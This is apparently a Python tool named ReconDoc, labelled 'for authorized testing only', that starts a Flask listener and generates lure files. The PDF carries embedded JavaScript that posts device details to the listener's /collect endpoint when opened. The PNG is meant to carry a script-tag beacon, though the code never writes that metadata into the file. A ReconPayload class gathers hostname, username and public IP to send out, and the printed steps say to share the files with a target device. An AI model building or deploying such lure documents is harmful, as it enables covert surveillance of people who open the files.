#!/usr/bin/env python3

import os
import sys
import venv
import subprocess
import platform
import socket
import json
import threading
import time
from datetime import datetime
import webbrowser
import base64
import struct
import sys
import pkg_resources

# Define constants
VENV_DIR = "recon_venv"
REQUIREMENTS = [
    "requests>=2.31.0",
    "tzlocal>=5.3.1",  # Updated to latest available version
    "flask>=3.0.0",
    "rich>=13.7.0",
    "Pillow>=10.2.0",
    "PyPDF2>=3.0.1"
]

class VirtualEnvManager:
    def __init__(self):
        self.venv_dir = VENV_DIR
        self.is_windows = platform.system().lower() == "windows"
        self.bin_dir = "Scripts" if self.is_windows else "bin"
        
        self.python_executable = os.path.join(
            self.venv_dir,
            self.bin_dir,
            "python.exe" if self.is_windows else "python"
        )
        self.pip_executable = os.path.join(
            self.venv_dir,
            self.bin_dir,
            "pip.exe" if self.is_windows else "pip"
        )

    def cleanup(self):
        """Remove virtual environment directory"""
        import shutil
        try:
            if os.path.exists(self.venv_dir):
                shutil.rmtree(self.venv_dir)
        except Exception as e:
            print(f"Warning: Failed to cleanup virtual environment: {str(e)}")

    def run_command(self, cmd, verbose=False):
        """Run a command and handle errors"""
        try:
            if verbose:
                result = subprocess.run(cmd, text=True, capture_output=True)
                if result.returncode != 0:
                    print(f"Error output: {result.stderr}")
                return result.returncode == 0
            else:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                return True
        except subprocess.CalledProcessError as e:
            if verbose:
                print(f"Command failed: {' '.join(cmd)}")
                print(f"Error: {str(e)}")
            return False
        except Exception as e:
            if verbose:
                print(f"Unexpected error: {str(e)}")
            return False

    def ensure_pip_installed(self):
        """Ensure pip is installed in the virtual environment"""
        try:
            # Try to run pip to check if it's working
            subprocess.run([self.pip_executable, "--version"], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL, 
                         check=True)
        except:
            print("[yellow]Installing pip in virtual environment...[/yellow]")
            # Download get-pip.py
            import urllib.request
            get_pip_url = "https://bootstrap.pypa.io/get-pip.py"
            get_pip_path = os.path.join(self.venv_dir, "get-pip.py")
            
            try:
                urllib.request.urlretrieve(get_pip_url, get_pip_path)
                # Install pip
                subprocess.run([self.python_executable, get_pip_path], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
            finally:
                if os.path.exists(get_pip_path):
                    os.remove(get_pip_path)

    def create_venv(self):
        """Create virtual environment if it doesn't exist"""
        from rich.console import Console
        console = Console()
        
        if not os.path.exists(self.venv_dir):
            console.print("[yellow]Creating new virtual environment...[/yellow]")
            try:
                # First try to install python3-venv if not present
                try:
                    subprocess.run(["apt-get", "update"], 
                                 stdout=subprocess.DEVNULL, 
                                 stderr=subprocess.DEVNULL)
                    subprocess.run(["apt-get", "install", "-y", "python3-venv"], 
                                 stdout=subprocess.DEVNULL, 
                                 stderr=subprocess.DEVNULL)
                except:
                    pass  # Ignore if fails (might not be Debian-based or no sudo)
                
                venv.create(self.venv_dir, with_pip=True)
                self.ensure_pip_installed()
                self.install_requirements(verbose=True)
            except Exception as e:
                console.print(f"[red]Failed to create virtual environment: {str(e)}[/red]")
                self.cleanup()  # Clean up failed environment
                console.print("\n[yellow]Please try these manual steps:[/yellow]")
                console.print("1. Install python3-venv:")
                console.print("   sudo apt-get update && sudo apt-get install python3-venv")
                console.print("2. Create virtual environment:")
                console.print("   python -m venv recon_venv")
                console.print("3. Activate it:")
                console.print("   source recon_venv/bin/activate")
                console.print("4. Install requirements:")
                console.print("   pip install requests tzlocal flask rich Pillow PyPDF2")
                sys.exit(1)
        else:
            console.print("[green]✓[/green] Virtual environment exists")
            self.install_requirements()

    def install_requirements(self, verbose=False):
        """Install required packages"""
        from rich.console import Console
        console = Console()
        
        if verbose:
            console.print("[yellow]Installing requirements...[/yellow]")
        
        try:
            # First upgrade pip
            if not self.run_command([self.pip_executable, "install", "--upgrade", "pip"], verbose):
                raise Exception("Failed to upgrade pip")

            # Then install requirements one by one
            for requirement in REQUIREMENTS:
                if verbose:
                    console.print(f"Installing {requirement}...")
                if not self.run_command([self.pip_executable, "install", requirement], verbose):
                    raise Exception(f"Failed to install {requirement}")
                
            if verbose:
                console.print("[green]✓[/green] All requirements installed successfully")
                
        except Exception as e:
            console.print(f"[red]Error installing requirements: {str(e)}[/red]")
            if verbose:
                console.print("[yellow]Trying alternative installation method...[/yellow]")
                try:
                    # Try using python -m pip as alternative
                    subprocess.check_call([
                        self.python_executable, "-m", "pip", "install", 
                        "requests", "tzlocal", "flask", "rich", "Pillow", "PyPDF2"
                    ], stdout=subprocess.DEVNULL if not verbose else None,
                       stderr=subprocess.DEVNULL if not verbose else None)
                    console.print("[green]✓[/green] Alternative installation successful")
                except:
                    self.cleanup()  # Clean up failed environment
                    console.print("[red]Both installation methods failed. Please try manually:[/red]")
                    console.print("1. Create new virtual environment:")
                    console.print("   python -m venv recon_venv")
                    console.print("2. Activate it:")
                    console.print("   source recon_venv/bin/activate")
                    console.print("3. Install packages:")
                    console.print("   pip install requests tzlocal flask rich Pillow PyPDF2")
                    sys.exit(1)

    def run_in_venv(self, args):
        """Run script in virtual environment"""
        cmd = [self.python_executable] + args
        try:
            subprocess.call(cmd)
        except Exception as e:
            print(f"Error running in virtual environment: {str(e)}")
            sys.exit(1)

class PayloadGenerator:
    def __init__(self):
        from rich.console import Console
        self.console = Console()
        self.output_dir = "payloads"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def create_pdf_payload(self, listener_url):
        """Create a PDF with embedded payload"""
        try:
            from PyPDF2 import PdfWriter, PdfReader
            import io
            from rich.progress import Progress, SpinnerColumn, TextColumn
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=self.console,
                transient=True,
            ) as progress:
                task = progress.add_task("Creating PDF payload...", total=None)
                
                # Create a basic PDF
                output_pdf = os.path.join(self.output_dir, "document.pdf")
                
                writer = PdfWriter()
                page = writer.add_blank_page(width=612, height=792)
                
                # Add visible content
                writer.add_js(f'''
                app.alert("Loading document...");
                var url = "{listener_url}/collect";
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                
                // Collect data
                var data = {{
                    "device": {{
                        "platform": app.platform,
                        "language": app.language,
                        "viewerType": app.viewerType,
                        "viewerVariation": app.viewerVariation
                    }}
                }};
                
                xhr.send(JSON.stringify(data));
                ''')
                
                # Save the PDF
                with open(output_pdf, 'wb') as output_file:
                    writer.write(output_file)
                
                progress.update(task, completed=True)
                self.console.print(f"[green]✓[/green] PDF payload created: {output_pdf}")
                
                return output_pdf
        except Exception as e:
            self.console.print(f"[red]✗ Failed to create PDF payload: {str(e)}[/red]")
            return None

    def create_image_payload(self, listener_url):
        """Create an image with embedded payload"""
        try:
            from PIL import Image
            from rich.progress import Progress, SpinnerColumn, TextColumn
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=self.console,
                transient=True,
            ) as progress:
                task = progress.add_task("Creating image payload...", total=None)
                
                # Create a basic image
                output_image = os.path.join(self.output_dir, "image.png")
                
                # Create a simple image
                img = Image.new('RGB', (800, 600), color='white')
                
                # Add metadata with the payload
                metadata = {
                    "Software": f"<script>fetch('{listener_url}/collect', {{method:'POST',body:JSON.stringify({{device:navigator.userAgent}})}});</script>"
                }
                
                # Save image with metadata
                img.save(output_image, pnginfo=Image.PngInfo())
                
                progress.update(task, completed=True)
                self.console.print(f"[green]✓[/green] Image payload created: {output_image}")
                
                return output_image
        except Exception as e:
            self.console.print(f"[red]✗ Failed to create image payload: {str(e)}[/red]")
            return None

class ReconPayload:
    def __init__(self):
        self.data = {}
        from rich.console import Console
        self.console = Console()
    
    def get_public_ip(self):
        """Get public IP address using ipify API"""
        try:
            import requests
            response = requests.get("https://api.ipify.org?format=json")
            self.data['public_ip'] = response.json()['ip']
        except Exception as e:
            self.data['public_ip'] = f"Error: {str(e)}"
    
    def get_system_info(self):
        """Collect system information"""
        try:
            self.data['system'] = {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'architecture': platform.machine(),
                'hostname': socket.gethostname(),
                'processor': platform.processor(),
                'username': os.getlogin(),
                'is_mobile': self.detect_mobile()
            }
        except Exception as e:
            self.data['system'] = f"Error: {str(e)}"
    
    def detect_mobile(self):
        """Detect if running on mobile device"""
        try:
            # Check common mobile platform identifiers
            system = platform.system().lower()
            machine = platform.machine().lower()
            
            mobile_indicators = ['android', 'ios', 'iphone', 'ipad', 'arm']
            return any(indicator in system.lower() or indicator in machine.lower() 
                      for indicator in mobile_indicators)
        except:
            return False
    
    def get_timezone(self):
        """Get system timezone"""
        try:
            from tzlocal import get_localzone
            self.data['timezone'] = str(get_localzone())
        except Exception as e:
            self.data['timezone'] = f"Error: {str(e)}"
    
    def collect_all(self):
        """Collect all information"""
        from rich.progress import Progress, SpinnerColumn, TextColumn
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
            transient=True,
        ) as progress:
            task1 = progress.add_task("Collecting public IP...", total=None)
            self.get_public_ip()
            progress.update(task1, completed=True)
            
            task2 = progress.add_task("Collecting system information...", total=None)
            self.get_system_info()
            progress.update(task2, completed=True)
            
            task3 = progress.add_task("Collecting timezone...", total=None)
            self.get_timezone()
            progress.update(task3, completed=True)
        
        return self.data
    
    def send_data(self, url):
        """Send collected data to the listener"""
        try:
            import requests
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=self.console,
                transient=True,
            ) as progress:
                task = progress.add_task("Sending data to server...", total=None)
                response = requests.post(url, json=self.data)
                progress.update(task, completed=True)
            return response.status_code == 200
        except Exception as e:
            return False

class ListenerServer:
    def __init__(self, host='0.0.0.0', port=5000):
        self.host = host
        self.port = port
        self.logs_dir = 'logs'
        self.ready = False
        from rich.console import Console
        self.console = Console()
        
        # Ensure logs directory exists
        if not os.path.exists(self.logs_dir):
            os.makedirs(self.logs_dir)
    
    def start(self):
        """Start the Flask server"""
        from flask import Flask, request, jsonify
        from rich.panel import Panel
        from rich.syntax import Syntax
        
        app = Flask(__name__)
        
        @app.route('/collect', methods=['POST'])
        def collect():
            try:
                data = request.get_json()
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                data['timestamp'] = timestamp
                
                filename = f"{self.logs_dir}/recon_{timestamp}.json"
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=4)
                
                # Pretty print the collected data
                self.console.print("\n[bold green]✓ Data Collection Complete[/bold green]")
                self.console.print(f"[dim]Saved to: {filename}[/dim]\n")
                
                # Format system information
                self.console.print(Panel.fit(
                    "\n".join([
                        f"[bold blue]System Information[/bold blue]",
                        f"Platform: {data['system']['platform']} {data['system']['platform_release']}",
                        f"Architecture: {data['system']['architecture']}",
                        f"Hostname: {data['system']['hostname']}",
                        f"Username: {data['system']['username']}\n",
                        f"[bold blue]Network Information[/bold blue]",
                        f"Public IP: {data['public_ip']}",
                        f"Timezone: {data['timezone']}"
                    ]),
                    title="[bold]Collected Information[/bold]",
                    border_style="blue"
                ))
                
                return jsonify({"status": "success", "message": f"Data saved to {filename}"}), 200
            except Exception as e:
                return jsonify({"status": "error", "message": str(e)}), 500
        
        @app.route('/health', methods=['GET'])
        def health():
            self.ready = True
            return jsonify({"status": "healthy"}), 200
        
        self.console.print(Panel.fit(
            f"[bold green]Server Status:[/bold green] Active\n"
            f"[bold]Host:[/bold] {self.host}\n"
            f"[bold]Port:[/bold] {self.port}\n"
            f"[bold]Logs:[/bold] ./{self.logs_dir}",
            title="[bold]ReconDoc Server[/bold]",
            border_style="green"
        ))
        
        app.run(host=self.host, port=self.port)

def print_banner():
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    
    console = Console()
    
    banner_text = Text()
    banner_text.append("ReconDoc Tool\n", style="bold cyan")
    banner_text.append("Security Testing Utility", style="bold blue")
    banner_text.append("\nMobile & Desktop Support", style="bold green")
    
    warning_text = Text()
    warning_text.append("\n⚠️  ", style="bold yellow")
    warning_text.append("For authorized testing only!", style="bold red")
    
    full_text = Text.assemble(banner_text, warning_text)
    
    console.print(Panel(
        full_text,
        border_style="cyan",
        expand=False,
        padding=(1, 2)
    ))

def wait_for_server(url, timeout=30):
    """Wait for server to be ready"""
    import requests
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn
    
    console = Console()
    start_time = time.time()
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("Waiting for server to start...", total=None)
        while time.time() - start_time < timeout:
            try:
                response = requests.get(f"{url}/health")
                if response.status_code == 200:
                    progress.update(task, completed=True)
                    return True
            except:
                time.sleep(1)
        return False

def run_all():
    """Run both server and payload generator"""
    from rich.console import Console
    console = Console()
    
    # Start listener server
    server = ListenerServer()
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()
    
    # Wait for server to be ready
    if not wait_for_server("http://localhost:5000"):
        console.print("[bold red]✗ Server failed to start![/bold red]")
        sys.exit(1)
    
    console.print("[bold green]✓[/bold green] Server is ready!")
    
    # Create payload generator
    generator = PayloadGenerator()
    
    # Generate both PDF and image payloads
    pdf_path = generator.create_pdf_payload("http://localhost:5000")
    image_path = generator.create_image_payload("http://localhost:5000")
    
    if pdf_path or image_path:
        console.print("\n[bold green]Payloads created successfully![/bold green]")
        console.print("\n[bold yellow]Instructions:[/bold yellow]")
        console.print("1. Share the generated files with target device")
        console.print("2. When opened, data will be sent to this server")
        console.print("3. Press Ctrl+C to stop the server when done")
    
    # Keep the server running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]⚠️  Shutting down...[/bold yellow]")
        sys.exit(0)

def main():
    print_banner()
    run_all()

if __name__ == "__main__":
    # If running the script directly, execute in virtual environment
    if not hasattr(sys, 'real_prefix') and not sys.base_prefix != sys.prefix:
        from rich.console import Console
        console = Console()
        console.print("[bold blue]→[/bold blue] Switching to virtual environment...")
        venv_manager = VirtualEnvManager()
        venv_manager.create_venv()
        venv_manager.run_in_venv([__file__])
    else:
        main() 